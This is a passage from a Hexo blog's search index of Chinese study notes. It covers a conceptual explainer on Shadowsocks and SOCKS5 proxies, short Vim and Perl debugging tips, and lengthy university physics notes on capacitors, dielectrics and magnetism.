<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>什么是机场-shadowsocks</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%BA%E5%9C%BA-shadowsocks/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%BA%E5%9C%BA-shadowsocks/</url>
    
    <content type="html"><![CDATA[<h1 id="参考-ArchWiki"><a href="#参考-ArchWiki" class="headerlink" title="参考 ArchWiki"></a><a href="https://wiki.archlinuxcn.org/wiki/Shadowsocks">参考 ArchWiki</a></h1><p>Shadowsocks 是一个轻量级 SOCKS5 代理.</p><h1 id="什么是-Socks5-协议"><a href="#什么是-Socks5-协议" class="headerlink" title="什么是 Socks5 协议"></a>什么是 Socks5 协议</h1><h2 id="参考-B-站"><a href="#参考-B-站" class="headerlink" title="参考 B 站"></a><a href="https://www.bilibili.com/video/BV1JA411u7mZ/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></h2><h2 id="参考-百度百科"><a href="#参考-百度百科" class="headerlink" title="参考 百度百科"></a><a href="https://baike.baidu.com/item/socks5/8915011">参考 百度百科</a></h2><p>SOCKS5 协议是一种代理协议，</p><p>SOCKS5 服务器在将通讯请求发送给真正服务器的过程中，对于请求数据包本身不加任何改变.</p><p>SOCKS5 服务器在接收到真正服务器的响应后，也原样转发给前端.</p><h2 id="参考-博客-socket5-协议的工作过程和协议细节"><a href="#参考-博客-socket5-协议的工作过程和协议细节" class="headerlink" title="参考 博客 socket5 协议的工作过程和协议细节"></a><a href="https://wiyi.org/socks5-protocol-in-deep.html">参考 博客 socket5 协议的工作过程和协议细节</a></h2><h3 id="什么是-socks-协议"><a href="#什么是-socks-协议" class="headerlink" title="什么是 socks 协议"></a>什么是 socks 协议</h3><p>示意图:</p><p><img src="/../img/SOCKs5_diagram.png"></p><p>socks 协议位于 OSI 模型中的第五层，会话层:</p><p><img src="/../img/OSI_module.png"></p><p>socket 是明文传输，用于翻墙容易被阻断.</p><p>socks 相当于在防火墙撕了一道口子，让合法的用户可以通过口子连接到内部, 从而访问内部的一些资源和进行管理.</p><h3 id="什么是-socks5-协议"><a href="#什么是-socks5-协议" class="headerlink" title="什么是 socks5 协议"></a>什么是 socks5 协议</h3><p>socks5 是 socks 协议的第五个版本.</p><p>socks5 在 socks4 的基础上新增 UDP 转发和认证功能，但是 socks5 并不兼容 sock4 协议.</p><h3 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h3><p>浏览器先和 socks5 代理建立 TCP 连接.</p><p><img src="/../img/how_socks5_works.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是软路由</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-Clash</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF-Clash/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF-Clash/</url>
    
    <content type="html"><![CDATA[<h1 id="参考-YouTube-Clash-的基本使用"><a href="#参考-YouTube-Clash-的基本使用" class="headerlink" title="参考 YouTube Clash 的基本使用"></a><a href="https://www.youtube.com/watch?v=9Ice-qMePQk">参考 YouTube Clash 的基本使用</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-中的-quickfix</title>
    <link href="/2022/11/29/Vim-%E4%B8%AD%E7%9A%84-quickfix/"/>
    <url>/2022/11/29/Vim-%E4%B8%AD%E7%9A%84-quickfix/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=1MjQ3mHqdbs">参考 Youtube</a></p><h1 id="搭配-quickfix-和搜索"><a href="#搭配-quickfix-和搜索" class="headerlink" title="搭配 quickfix 和搜索"></a>搭配 quickfix 和搜索</h1><p>需要使用 <code>:vimgrep</code>, 其会输出到 quickfix 中. (vimgrep 需指定文件名)</p><h1 id="搭配-make"><a href="#搭配-make" class="headerlink" title="搭配 make"></a>搭配 make</h1><p>make 运行的结果会输出到 quickfix 中.</p><h1 id="在没有-Makefile-时设置-make-运行的程序"><a href="#在没有-Makefile-时设置-make-运行的程序" class="headerlink" title="在没有 Makefile 时设置 make 运行的程序"></a>在没有 Makefile 时设置 make 运行的程序</h1><p>设置一个变量如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> makeprg=gcc<br></code></pre></td></tr></table></figure><p>可以用 <code>:h makeprg</code> 查看相关文档.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-中的-debugger</title>
    <link href="/2022/11/29/Perl-%E4%B8%AD%E7%9A%84-debugger/"/>
    <url>/2022/11/29/Perl-%E4%B8%AD%E7%9A%84-debugger/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>$ perldoc perldebug</code> 查看文档.</p><h1 id="x-命令后面是-reference"><a href="#x-命令后面是-reference" class="headerlink" title="x 命令后面是 reference"></a><code>x</code> 命令后面是 reference</h1><hr><p>可以直接在 debugger 中写代码.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-中插件-vim-spector-使用</title>
    <link href="/2022/11/29/Vim-%E4%B8%AD%E6%8F%92%E4%BB%B6-vim-spector-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/29/Vim-%E4%B8%AD%E6%8F%92%E4%BB%B6-vim-spector-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1JT4y1u7aE/?spm_id_from=333.788.recommend_more_video.2&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></p><p>启用一个语言的调试器, 在 <code>Plug</code> 后加 <code>--enable</code> 如:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Plug <span class="hljs-string">&#x27;puremourning/vimspector&#x27;</span>, &#123;<span class="hljs-string">&#x27;do&#x27;</span>: <span class="hljs-string">&#x27;./install_gadget.py --enable-python&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>注意安装相关依赖.</p><p>注意设置模板文件.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>暂时解决-fluid-主题-数学公式换行问题</title>
    <link href="/2022/11/28/%E6%9A%82%E6%97%B6%E8%A7%A3%E5%86%B3-fluid-%E4%B8%BB%E9%A2%98-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/"/>
    <url>/2022/11/28/%E6%9A%82%E6%97%B6%E8%A7%A3%E5%86%B3-fluid-%E4%B8%BB%E9%A2%98-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>使用 <code>\displaylines&#123;&#125;</code>, 然后把所有代码写在其中.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大物II上半期-Notes2</title>
    <link href="/2022/11/27/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F-Notes2/"/>
    <url>/2022/11/27/%E5%A4%A7%E7%89%A9II%E4%B8%8A%E5%8D%8A%E6%9C%9F-Notes2/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage"><a href="#Chapter-22-Capacitance-Dielectrics-Electric-Energy-Storage" class="headerlink" title="Chapter 22 Capacitance, Dielectrics, Electric Energy Storage"></a>Chapter 22 Capacitance, Dielectrics, Electric Energy Storage</h1><h2 id="22-1-Capacitors"><a href="#22-1-Capacitors" class="headerlink" title="22.1 Capacitors"></a>22.1 Capacitors</h2><p>A capacitor 有时也被称为 condenser, 可以存储 electric charge, 常常由两个导体, 放得接近但是不接触组成.</p><p>非常小的 capacitors 用来电脑 RAM 中存储 0 和 1 的二进制.</p><p>常常两个板子卷成圆柱体, 中间夹着纸或者其他 insulator:<br><img src="/../img/capacitor_seperate_by_insulators.png"><br>capacitor 的 symbol 为:</p><p><img src="/../img/capacitor_symbol.png"></p><p>电源也可以看作是 capacitor, 从其符号也可以看出来:</p><p><img src="/../img/source_symbol.png"></p><p>将电源和 capacitor 联通可以充电:<br>$$<br>Q &#x3D; C V_{ab}<br>$$</p><p><img src="/../img/charge_capacitors.png"></p><p>这里的 $C$ 就是 capacitance of the capacitor. 单位是 $C &#x2F; V$, 即 $F$, a farad.</p><p>$C$ 的值取决与 capacitor 的大小, 形状, 两个导体的相对距离, 以及材料.</p><h2 id="22-2-Dtermination-of-Capacitance"><a href="#22-2-Dtermination-of-Capacitance" class="headerlink" title="22.2 Dtermination of Capacitance"></a>22.2 Dtermination of Capacitance</h2><p>推导公式, 这里假设 capacitors 的形状简单, 之间的 insulator 为真空或空气, 两个 conductor 之间的距离 $d$ 很短, 每一个 plate 的面积为 A.</p><p>根据 $E &#x3D; \frac{\sigma}{\epsilon_0}$ 和 $\sigma &#x3D; \frac{Q}{A}$ 得到:<br>$$<br>E &#x3D; \frac{Q}{\epsilon_0 A}<br>$$<br>又因为:<br>$$<br>V_{ba} &#x3D; - \int_a^b E \cdot dl<br>$$<br>这里是点乘, 也就是向量, 需要知道 E 和 $dl$ 之间的角度, 从图上可以看出, a -&gt; b 的方向和 E 的方向相反, 则 $\theta &#x3D; 180^\circ$, 即 $\cos 180^\circ &#x3D; -1$:</p><p><img src="/../img/derive_equation_of_capacitance.png"></p><p>则有:<br>$$<br>V_{ba} &#x3D; V_b - V_a &#x3D; -\int_a^b E dl \cos 180^\circ &#x3D; +\int_a^b E dl &#x3D; \frac{Q}{\epsilon_0 A} \int_a^b dl &#x3D; \frac{Q d}{\epsilon_0 A}<br>$$</p><p>最终:<br>$$<br>C &#x3D; \frac{Q}{V_{ba}} &#x3D; \epsilon_0 \frac{A}{d}<br>$$</p><h3 id="习题-22-1"><a href="#习题-22-1" class="headerlink" title="习题 22-1"></a>习题 22-1</h3><p>(a) 已知面积 A 和 distance d 求 capacitance. 利用 $C &#x3D; \epsilon_0 \frac{A}{d}$ 计算.</p><p>(b) 已知 C 和 V 计算 Q.</p><p>(c) 已知 Q 计算 E.</p><h3 id="习题-22-2"><a href="#习题-22-2" class="headerlink" title="习题 22-2"></a>习题 22-2</h3><p>这道题是让我们推导出一个计算 C 的公式, 一个重点在于求 a long wire 外的电场:</p><p><img src="/../img/cylindrical_capacitor.png"></p><p>下面的那个是截面图.</p><p>a long wire 外的电场的推导式为:<br>$$<br>dq &#x3D; \lambda dl<br>$$<br>形成的电场 $dE$ 为:<br>$$<br>dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r^2}<br>$$</p><p><img src="/../img/long_wire_field.png"></p><p>因为 $E_y &#x3D; 0$ 我们可以知道:<br>$$<br>E &#x3D; E_x &#x3D; \int dE \cos \theta<br>$$<br>又 $y &#x3D; x \tan \theta$, 具体看书, 约去一部分后就有了:<br>$$<br>E &#x3D; \frac{1}{2 \pi \epsilon_0} \frac{\lambda}{x}<br>$$</p><h3 id="习题-22-3"><a href="#习题-22-3" class="headerlink" title="习题 22-3"></a>习题 22-3</h3><p>这道题是两个同心球, 图像同样是截面图:</p><p><img src="/../img/spherical_capacitor.png"></p><p>主要还是先求电场, 然后再利用 $V_{ab} &#x3D; -\int E \cdot dl$ 来求电势.</p><p>这里求电场用的是高斯定理. 其算出, the electric field outside a uniformly charged conducting sphere is $E &#x3D; \frac{Q}{4 \pi \epsilon_0 r^2}$.</p><p>只有一层 conductor 的也可以计算 capacitance, 只不过假设与另一层的距离为 $\infty$. 但其不能被视作是 capacitor.</p><h2 id="22-3-Capacitors-in-Series-and-Parallel"><a href="#22-3-Capacitors-in-Series-and-Parallel" class="headerlink" title="22.3 Capacitors in Series and Parallel"></a>22.3 Capacitors in Series and Parallel</h2><p>主要是将并联和串联的 capacitors 转换成等效的一个 capacitor.</p><p><mark>capacitors 并联</mark> :</p><p><img src="/../img/capacitor_parallel.png"></p><p>由于 capacitors 的正极板的电势相等:<br>$$<br>Q &#x3D; Q_1 + Q_2 + Q_3 &#x3D; C_1V + C_2V + C_3V<br>$$<br>又有:<br>$$<br>Q &#x3D; C_{eq} V<br>$$<br>则:<br>$$<br>C_{eq} V &#x3D; (C_1 + C_2 + C_3)V<br>$$<br>得到:<br>$$<br>C_{eq} &#x3D; C_1 + C_2 + C_3<br>$$</p><p><mark>capacitors 串联</mark>:</p><p><img src="/../img/capacitor_serial.png"></p><p>利用每一个 capacitor 的 Q 相同得出:<br>$$<br>\frac{1}{C_{eq}} &#x3D; \frac{1}{C_1} + \frac{1}{c_2} + \frac{1}{C_3}<br>$$<br>串联之后, C_{eq} 比任何一个串联的 capacitor 都要小.</p><h3 id="习题-22-6"><a href="#习题-22-6" class="headerlink" title="习题 22-6"></a>习题 22-6</h3><p>当两个 capacitor 充好电之后, 将这两个 capacitor 相连, 只不过是一个的正极板接另一个的负极板, 求 $q_1$ 和 $q_2$ 的值:</p><p><img src="/../img/connect_two_capacitor.png"></p><blockquote><p>解题</p></blockquote><p>切入点是 $V^\prime$ 相等, 已知 $C_1$ 和 $C_2$:<br>$$<br>\displaylines{q_1 &#x3D; C_1 V^\prime \newline~ q_2 &#x3D; C_2 V^\prime \newline~ q_1 + q_2 &#x3D; Q_1 - Q_2 \newline~ V^\prime &#x3D; \frac{q_1 + q_2}{C_1 + C_2}}<br>$$<br>然后把 $V^\prime$ 带回即可.</p><h2 id="22-4-电能存储-Electric-Energy-Storage"><a href="#22-4-电能存储-Electric-Energy-Storage" class="headerlink" title="22.4 电能存储 Electric Energy Storage"></a>22.4 电能存储 Electric Energy Storage</h2><p><img src="/../img/electron_move_through_capacitor.png"><br>存储在 capacitor 中的能量和用来 charge 它所做的功的一样多.</p><p>给一个 capacitor 充电就是将电子从一个极板移动到另一个极板.</p><p>capacitor 不是瞬间充好电，需要一定的时间.</p><p>从 $C &#x3D; \frac{Q}{V}$ 可以看出，一个极板上的 $Q$ 越大，将一个电子一到极板另一侧所需的能量 $V$ 也就越大 (毕竟 $C$ 是常数，和 $Q$，$V$ 无关)</p><blockquote><p>能量公式推导</p></blockquote><p>$$<br>\displaylines{dW &#x3D; V dq \newline~ V &#x3D; \frac{q}{C} \newline~ W &#x3D; \int V dq &#x3D; \frac{1}{C} \int q dq &#x3D; \frac{1}{2} \frac{Q^2}{C} \newline~ U &#x3D; \frac{1}{2} \frac{Q^2}{C} \newline~ Q &#x3D; CV \newline~ U &#x3D; \frac{1}{2} \frac{Q^2}{C} &#x3D; \frac{1}{2}CV^2\newline~}<br>$$</p><h3 id="将能量存储在电容中视为存储在电场中"><a href="#将能量存储在电容中视为存储在电场中" class="headerlink" title="将能量存储在电容中视为存储在电场中"></a>将能量存储在电容中视为存储在电场中</h3><p>更好的理解能量存储在电容中是将其看作存储在电场中.</p><blockquote><p>公式推导</p></blockquote><p>$$<br>\displaylines{V &#x3D; Ed \newline~ C &#x3D; \frac{\epsilon_0A}{d} \newline~ U &#x3D; \frac{1}{2}CV^2 &#x3D;\frac{1}{2} \frac{\epsilon_0A}{d} E^2 d^2 &#x3D; \frac{1}{2} \epsilon_0 E^2 A d \newline~}<br>$$<br>$A$ 是面积，$d$ 是极板间的距离，因此 $Ad$ 可以看作体积. 除开体积之后得到的就是能量密度:<br>$$<br>u &#x3D; energy_density &#x3D; \frac{1}{2} \epsilon_0 E^2<br>$$<br>这里的 $\epsilon_0A$ 是真空下的介电常数.</p><h2 id="22-5-电介质-Dielectrics"><a href="#22-5-电介质-Dielectrics" class="headerlink" title="22-5 电介质 Dielectrics"></a>22-5 电介质 Dielectrics</h2><p>Dielectrics 指的是 capacitor 中间的填充物.</p><p>Dielectrics 会影响 capacitance 的大小，影响的程度为常数 $K$ 表示, $\epsilon$ 是引入的新的 quantity, 成为物质的 permittivity (电介常数，也就是电介质的常数), 而 $\epsilon_0$ 是电介质为真空时的电介常数.</p><p><mark>介电常数是一个相对值，以真空中为基准，是1</mark> .<br>$$<br>\displaylines{C &#x3D; K C_0 \newline~ C_0 &#x3D; \epsilon_0 \frac{A}{d} \newline~ C &#x3D; K \epsilon_0 \frac{A}{d} \newline~ \epsilon &#x3D; K \epsilon_0 \newline~ C &#x3D; \epsilon \frac{A}{d}}<br>$$<br>$C_0$ 是当填充物为真空时的 capacitance. </p><blockquote><p>由于电容 $C$ 的变化而导致其他物理量的变化为, 原有的量为 $C_0$, $Q_0$, $V_0$, $E_0$</p></blockquote><blockquote><ol><li>V 不变, Q的变化<br>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ Q &#x3D; K Q_0}<br>$$</li></ol></blockquote><blockquote><ol start="2"><li>Q 不变, V 的变化<br>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ V &#x3D; \frac{V_0}{K}}<br>$$</li></ol></blockquote><blockquote><ol start="3"><li>Q 不变, E 的变化<br>$$<br>\displaylines{C &#x3D; \frac{Q}{V} \newline~ C &#x3D; K C_0 \newline~ V &#x3D; \frac{V_0}{K} \newline~ \newline E &#x3D; \frac{V}{d} \newline~ \newline E &#x3D; \frac{V_0}{Kd} &#x3D; \frac{E_0}{K}}<br>$$</li></ol></blockquote><h2 id="22-6-介电常数分子层面的描述-Molecular-Description-of-Dielectrics"><a href="#22-6-介电常数分子层面的描述-Molecular-Description-of-Dielectrics" class="headerlink" title="22-6 介电常数分子层面的描述 Molecular Description of Dielectrics"></a>22-6 介电常数分子层面的描述 Molecular Description of Dielectrics</h2><p>解释为什么在电极板间插入 Dielectrics 之后 capacitance 会增大 (都是变大).</p><p>书上的四幅图:<br><img src="/../img/why_dielectric_change_the_capacitance.png"></p><blockquote><p>解析</p></blockquote><p>图 a 是没有放入 Dielectrics 的电场示意图. </p><p>图 b 是放入了，由于 permanent dipole moment 的影响，物质内的分子一开始并不是像这样排列整齐的，而外部电场的作用使其整齐排列，负极朝向极板的正极.</p><p>从图 c 可以看出，部分电场线没有穿过 Dielectrics, 也就是说电场线数量减少，电场变小，</p><p>同时, 从图 d 看出，没有电场线穿过的部分，其内部形成了与原电场反向的电场，这是一个感应电场.</p><p>这里电场减小的 factor 假设为 K.</p><blockquote><p>公式推导<br>$$<br>\displaylines{E &#x3D; \frac{E_0}{K} \newline~ \newline V_0 &#x3D; E_0 d \newline~ \newline V &#x3D; Ed \newline~ \newline V &#x3D; \frac{V_0}{K} \newline~ \newline C &#x3D; K C_0}<br>$$</p></blockquote><blockquote><p>关于几个感应量 $E_{ind}$, $\sigma_{ind}$, 和 $Q_{ind}$ 的公式推导, $\sigma$ 是 charge density</p></blockquote><p>$$<br>\displaylines{E &#x3D; E_0 - E_{ind} &#x3D; \frac{E_0}{K} \newline~ \newline E_{ind} &#x3D; E_0(1 - \frac{1}{K}) \newline~ \newline E &#x3D; \frac{\sigma}{\epsilon_0}, E_0 &#x3D; \frac{\sigma_0}{\epsilon_0} \newline~ \newline \sigma_{ind} &#x3D; \sigma(1 - \frac{1}{K}) \newline~ \newline \sigma &#x3D; \frac{Q}{A} \newline~ \newline Q_{ind} &#x3D; Q(1- \frac{1}{K})}</p><p>$$</p><h1 id="Chapter-25-磁-Magnetism"><a href="#Chapter-25-磁-Magnetism" class="headerlink" title="Chapter 25 磁 Magnetism"></a>Chapter 25 磁 Magnetism</h1><p>“Magnets” 这一名称的由来: 人们在 Asia Minor 下一个叫 Magnesia 的地方发现能相互吸引的石头，就把这些石头用发现地命名为 “Magnets”</p><h2 id="25-1-磁和磁场-Magnets-and-Magnetic-Field"><a href="#25-1-磁和磁场-Magnets-and-Magnetic-Field" class="headerlink" title="25-1 磁和磁场 Magnets and Magnetic Field"></a>25-1 磁和磁场 Magnets and Magnetic Field</h2><p>Magnets 一般有两种形状:</p><ul><li>bar, 条状 </li><li>horseshoe, 马蹄状</li></ul><p><img src="/../img/the_square_of_magnets.png"></p><p>对 Magnets 的 N 极 (North)和 S 极 (South) 的定义:</p><ul><li>指向地理上的北极的一侧称为 N 极</li><li>指向地理上的南极的一侧称为 S 极</li></ul><p>暂时不存在只有一个磁极的磁铁. 一个磁铁分为两截后同样会同时具有 N 极和 S 极。</p><p>每个物体都有磁性，但是强度不同。</p><h3 id="磁性的由来"><a href="#磁性的由来" class="headerlink" title="磁性的由来"></a>磁性的由来</h3><h4 id="参考知乎1"><a href="#参考知乎1" class="headerlink" title="参考知乎1"></a><a href="https://www.zhihu.com/question/38879132/answer/81035171">参考知乎1</a></h4><p>磁场的产生可以分为两种:</p><ul><li>运动电流 (变化的电场产生磁场)</li><li>基本粒子的自旋</li></ul><p>所有物质都有磁性，只是大小不同.</p><p>浅显的认知: 不容易被磁化的物质，其内部的原子难以受外部磁场的影响而排列整齐.</p><p>磁力的存在是由于磁场.</p><h4 id="参考-YouTube"><a href="#参考-YouTube" class="headerlink" title="参考 YouTube"></a><a href="https://www.youtube.com/watch?v=MRqQQGO7Xe8">参考 YouTube</a></h4><p>质子和电子的自旋:<br><img src="/../img/self_rotate_of_proton_and_electron.png"></p><p>自旋和电子绕核旋转都会产生电流:<br><img src="/../img/current_made_by_self_rotate_indecate_mag.png"></p><p>如这张图，这三个磁场向量合向量就是这个粒子的磁场方向.</p><h5 id="同一方向"><a href="#同一方向" class="headerlink" title="同一方向"></a>同一方向</h5><p>如果所有的粒子的磁场向量都位于一个方向:<br><img src="/../img/vector_in_the_same_direction.png"></p><p>那么其合向量就很大. 物体就会表现出磁性.</p><h5 id="不同方向"><a href="#不同方向" class="headerlink" title="不同方向"></a>不同方向</h5><p>如果各个粒子的向量方向不同，那么就会有狠多被抵消掉:<br><img src="/../img/vectors_in_different_direction.png"></p><p>物体的磁性就不会表现出.</p><h5 id="施加外部磁场"><a href="#施加外部磁场" class="headerlink" title="施加外部磁场"></a>施加外部磁场</h5><p>施加一个外部磁场，可能使物体内粒子产生的磁场向量方向排列整齐，这也是为什么铁块在靠经一块磁铁使就具有了磁性:</p><p><img src="/../img/outer_magnetic_field_adjust_the_vectors_direction.png"></p><h5 id="相关数学公式"><a href="#相关数学公式" class="headerlink" title="相关数学公式"></a>相关数学公式</h5><p><img src="/../img/related_mathmatic_equations_in_why_there_is_a_magnetism.png"></p><h3 id="磁场线"><a href="#磁场线" class="headerlink" title="磁场线"></a>磁场线</h3><p><mark>方向的定义</mark>:</p><p>磁场线的方向是在磁场中，小磁针 N 极转动的方向.</p><p>磁场线的密集程度和磁场强度成正比.</p><p>在磁铁外部，磁场线总是从 N 极发出并回到 S 极. 且始终是一个闭合的曲线.<br><img src="/../img/magnetic_filed_line_direction.png"></p><p>形成完美的 uniform field 的并不容易，但是当:</p><ul><li>磁极表面远大于两个磁极之间的距离</li></ul><p>可以近似得到一个 uniform field.<br><img src="/../img/magnetic_field_beteewn_two_large_face.png"></p><h2 id="25-2-电生磁-Electric-Currents-Produce-Magnetism"><a href="#25-2-电生磁-Electric-Currents-Produce-Magnetism" class="headerlink" title="25-2 电生磁 Electric Currents Produce Magnetism"></a>25-2 电生磁 Electric Currents Produce Magnetism</h2><p>用右手定则根据电流的方向判断生成的磁场的方向.</p><p>有两种情况:</p><ul><li>electric current in a straight wire</li><li>a circular loop of wire</li></ul><p><img src="/../img/right_hand_rule_determine_the_direction_of_magnetic_field.png"></p><h2 id="25-3-在磁场中电流所受到的力-B-的定义-Force-on-an-Electric-Current-in-a-Magnetic-Field-Definition-of-B"><a href="#25-3-在磁场中电流所受到的力-B-的定义-Force-on-an-Electric-Current-in-a-Magnetic-Field-Definition-of-B" class="headerlink" title="25-3 在磁场中电流所受到的力; B 的定义 Force on an Electric Current in a Magnetic Field; Definition of B"></a>25-3 在磁场中电流所受到的力; B 的定义 Force on an Electric Current in a Magnetic Field; Definition of B</h2><p>从小磁针转动可以知道，其受到了一定力的作用.</p><p>力的方向与电流方向和磁场方向都垂直, 也可以用右手定则判断, 拇指方向为力的方向:</p><p><img src="/../img/right_hand_rule_the_direction_of_force.png"></p><blockquote><p>计算公式推导</p></blockquote><p>首先有观察到这样一个关系:<br>$$<br>F \propto IlB \sin \theta<br>$$<br>然后:<br>$$<br>\displaylines{F &#x3D; IlB \sin \theta \newline~ \newline F &#x3D; Il \times B}<br>$$<br>后者为向量形式， $l$ 和 $B$ 是向量。和 $\sin$ 相关的都可以改为叉乘，且可以用右手定则判断方向.</p><p>更加通用的形式:<br>$$<br>dF &#x3D; I dl \times B<br>$$</p><h3 id="B-的定义"><a href="#B-的定义" class="headerlink" title="B 的定义"></a>B 的定义</h3><p>可以看作是磁感线的密集程度，单位面积穿过的磁感线数量. 其大小在 26 章描述</p><p>SI 单位是 Tesla (T), $T &#x3D; 1N&#x2F;A \cdot m$.</p><p>地球表面的磁场强度为 $0.5 \times 10^{-4}T$.</p><p>两个表示 B 方向的符号:</p><blockquote><p>向外 point out</p></blockquote><p><img src="/../img/magnetic_field_point_out.png"></p><blockquote><p>向里 point inward</p></blockquote><p><img src="/../img/magnetic_filed_point_inward.png"></p><h2 id="25-4-在磁场中移动的电子受到的力-Force-on-an-Electric-Charge-Moving-in-a-Magnetic-Field"><a href="#25-4-在磁场中移动的电子受到的力-Force-on-an-Electric-Charge-Moving-in-a-Magnetic-Field" class="headerlink" title="25-4 在磁场中移动的电子受到的力 Force on an Electric Charge Moving in a Magnetic Field"></a>25-4 在磁场中移动的电子受到的力 Force on an Electric Charge Moving in a Magnetic Field</h2><blockquote><p>公式推导, 已知在时间 t 内穿过 N 个带电量为 q 的粒子<br>$$<br>\displaylines{I &#x3D; \frac{Nq}{t} \newline~ \newline l &#x3D; vt \newline~ \newline F &#x3D; Il \times B \newline~ \newline F &#x3D; \frac{Nq}{t} vt \times B \newline~ \newline F &#x3D; Nqv \times B}<br>$$<br>那么一个粒子受到的力就为:<br>$$<br>F &#x3D; qv \times B<br>$$</p></blockquote><blockquote><p>力的方向判断, 这里的 $v$ 是粒子运动方向, 因此用右手定则判断 </p></blockquote><p>拇指方向为力的方向, 四指为粒子运动方向 (不是电流方向). 注意粒子的电性会影响最终的结果.</p><p><img src="/../img/direction_of_force_when_there_is_a_charge.png"></p><h3 id="在均匀磁场中"><a href="#在均匀磁场中" class="headerlink" title="在均匀磁场中"></a>在均匀磁场中</h3><p>做匀速圆周运动，且不做功 (力的方向和运动方向垂直)</p><p><img src="/../img/uniform_circle_move_of_charge_in_uniform_magnetic_field.png"></p><blockquote><p>结合圆周运动的相关公式推导</p></blockquote><p>$$<br>\displaylines{F &#x3D; ma \newline~ \newline a &#x3D; \frac{v^2}{r} \newline~ \newline F &#x3D; qvB &#x3D; \frac{mv^2}{r} \newline~ \newline r &#x3D; \frac{mv}{qB} \newline~ \newline T &#x3D; \frac{2 \pi r}{v} \newline~ \newline T &#x3D; \frac{2 \pi m}{qB}}<br>$$</p><p>当速度方向和磁场方向不垂直时的路径为 Spiral Path:<br><img src="/../img/spiral_path_when_velocity_not_perpendicular_to_magnetic_field.png"></p><h3 id="同时位于磁场和电场中"><a href="#同时位于磁场和电场中" class="headerlink" title="同时位于磁场和电场中"></a>同时位于磁场和电场中</h3><p>Lorentz equation:</p><p>$$<br>F &#x3D; q(E + v \times B)<br>$$</p><h2 id="25-5-环形电路中的力矩-磁偶矩-Torque-on-a-Current-Loop-Magnetic-Dipole-Moment"><a href="#25-5-环形电路中的力矩-磁偶矩-Torque-on-a-Current-Loop-Magnetic-Dipole-Moment" class="headerlink" title="25-5 环形电路中的力矩; 磁偶矩 Torque on a Current Loop; Magnetic Dipole Moment"></a>25-5 环形电路中的力矩; 磁偶矩 Torque on a Current Loop; Magnetic Dipole Moment</h2><p>观察这幅图, 其中 <img src="/../img/magnetic_field_point_out.png"> 和 <img src="/../img/magnetic_filed_point_inward.png"> 是力的方向, 这里的 torque 也是电压表等器材指针转动的原理:</p><p><img src="/../img/torque_on_a_current_loop.png"></p><blockquote><p>公式推导</p></blockquote><p>$$<br>\displaylines{\tau &#x3D; l_1 \times F  \newline~ \newline l_1 &#x3D; \frac{b}{2} \newline~ \newline F &#x3D; Il_2 \times B \newline~ \newline l_2 &#x3D; a \newline~ \newline \tau &#x3D; \frac{b}{2} I a B + \frac{b}{2} I a B &#x3D; Iab B \newline~ \newline A &#x3D; ab \newline~ \newline \tau &#x3D; IA B}<br>$$<br>可以看出 $ab$ 是线圈的面积. 如果线圈有 N 轧:<br>$$<br>\tau &#x3D; N IA B &#x3D; N IA B<br>$$</p><p>如果线圈和磁场不是垂直的，磁场强度 B 会变化如:<br><img src="/../img/not_perpendicular_the_magnetic_field_and_current_loop.png"></p><p>此时 $\tau$ 变为:<br>$$<br>\tau &#x3D; NIAB \sin \theta<br>$$<br>$\theta$ 为小角 ( $0^\circ ~ 90^\circ$ ).</p><p>为了将 $\tau$ 的计算式写成两个物理量相乘的形式, 